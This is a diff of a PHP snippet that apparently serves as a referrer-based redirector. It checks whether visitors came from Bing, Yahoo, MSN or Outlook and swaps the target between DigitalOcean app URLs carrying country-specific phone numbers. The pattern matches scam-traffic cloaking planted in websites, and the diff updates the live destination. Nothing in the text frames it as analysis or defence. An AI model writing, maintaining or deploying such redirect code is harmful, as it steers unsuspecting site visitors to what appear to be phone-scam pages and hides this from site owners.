@@ -8,9 +8,8 @@
     $referers_bing=array('yahoo','outlook','msn','becovi','bing');
 
     $lanzar=true;
-   //$dominio_m='urchin-app-ykwwi.ondigitalocean.app/?phone=910-971-803'; //es 910
-   // $dominio_m='urchin-app-2-udbgy.ondigitalocean.app/?phone=919-610-587'; //es 919
-   $dominio_m='whale-app-z8c92.ondigitalocean.app/?phone=01-87-65-31-10'; // fr 919
+    
+    $dominio_m='urchin-app-2-udbgy.ondigitalocean.app/?phone=xxxxxxxxxx'; //mexique
 
     $encontrado=true;
     if ($_SERVER["HTTP_REFERER"]!='' && $lanzar){
